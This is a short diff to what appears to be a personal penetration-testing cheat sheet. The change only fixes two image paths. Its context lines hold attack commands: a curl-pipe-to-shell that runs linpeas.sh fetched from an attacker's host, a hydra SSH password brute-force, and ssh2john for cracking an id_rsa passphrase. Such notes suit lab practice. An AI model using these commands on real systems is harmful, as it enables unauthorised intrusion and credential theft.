@@ -84,7 +84,7 @@ sudo python3 -m http.server 80
 #Victim
 curl 10.17.72.21/linpeas.sh | sh
 => or send it 
-![alt text](image.png)
+![alt text](/assets/image.png)
 ## Change Username Hostname 
 https://www.youtube.com/watch?v=VM64fH6tEEU&ab_channel=RyanJohn
 ## hydra 
@@ -92,7 +92,7 @@ hydra -l ~Username~ -P 'list.txt' ssh://10.10.65.127
 ## tee
 send output to a file
 
-![alt text](image-1.png)
+![alt text](/assets/image-1.png)
 ## Find id-rsa passphrase
 ┌──(mamy㉿mamy)-[~]
 └─$ ssh2john '/home/kali/Desktop/id_rsa' 
